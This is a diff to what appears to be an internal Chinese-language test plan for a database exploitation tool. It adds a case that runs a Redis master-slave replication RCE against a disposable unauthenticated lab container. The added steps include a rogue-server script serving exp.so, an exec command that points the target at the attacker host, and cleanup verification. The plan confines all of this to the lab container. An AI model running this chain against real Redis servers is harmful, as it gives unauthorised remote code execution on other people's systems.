@@ -165,6 +165,21 @@ unzip -l MDAT-DEV/target/mdut.jar | grep -cE "org/sqlite/|redis/clients/|com/mon
 | 4 | `info` → `exec --id <ID> 'id'` | 版本回显；UDF 链（落盘/建函数/执行）**全程经代理**跑通，回显 `uid=` |
 | 5 | `clean` → `delete` → 删 `tasks/lab-tc4` | 查证 mysql.func 空且无 .temp；资源清零 |
 
+**TC5 — Redis 主从复制 RCE（172.31.0.21 未授权靶标，可弃容器）**
+
+> 环境：`dsx-internal` 网络（172.31.0.0/24）静态 IP 靶标；本机 172.31.0.1 网桥即攻击出口。**变异红线：仅限该可弃靶标容器**，禁止对任何共享实例执行。
+
+| 步骤 | 命令/动作 | 判定 |
+|---|---|---|
+| 1 | `docker run -d --name mdut-redis-int --network dsx-internal --ip 172.31.0.21 redis:4.0.14` | 容器 up；`redis-cli -h 172.31.0.21 ping` 返回 PONG（未授权） |
+| 2 | `./cli/mdut --task lab-tc5 add redis --host 172.31.0.21 --port 6379` | 退出码 0 + `"id"`（无密码登记成功） |
+| 3 | `info --id <ID>` | `data.cves` 含 `UNAUTH`（high）与 `SLAVE-MODULE-RCE`（critical，4.x–5.0.5 窗口） |
+| 4 | `python3 MDAT-DEV/src/main/Plugins/Redis/redis-cus-rogue.py 21000 MDAT-DEV/src/main/Plugins/Redis/exp.so`（**单发进程**：每次部署前重启；后台保活） | 监听 21000 |
+| 5 | `exec --id <ID> --vps-host 172.31.0.1 --vps-port 21000 'id'` | 回显 `uid=999(redis)`（回显前缀可能带 ELF 流残留字节，属 system.exec 已知行为）；**若模块已加载（先 `module list` 查），重复部署报 ERR loading extension——直接走步骤 6** |
+| 6 | `exec --id <ID> 'whoami'`（无 `--vps-*`） | 已部署态直连 system.exec 回显 |
+| 7 | `clean --id <ID>` → 容器内查证 | `module list` 为空、`/data` 无 exp.so、`slave-read-only=yes`、`dbfilename=dump.rdb`、`role:master` |
+| 8 | `delete <ID>`；`docker rm -f mdut-redis-int`；删 `tasks/lab-tc5`；确认无 21000 监听 | 资源清零 |
+
 **清理义务**：每条 TC 结束后删除入口 shell/frpc 进程与文件、停 frps、删对应 `tasks/<task>/`（含 data.db 与审计账），并在任务记录留痕。**TC4 追加**：壳 A 上删除 frpc 二进制与配置（参照 GSL5 TC3 教训：Tomcat 场景删 shell 需同删 `work/` 编译缓存）。
 
 ---
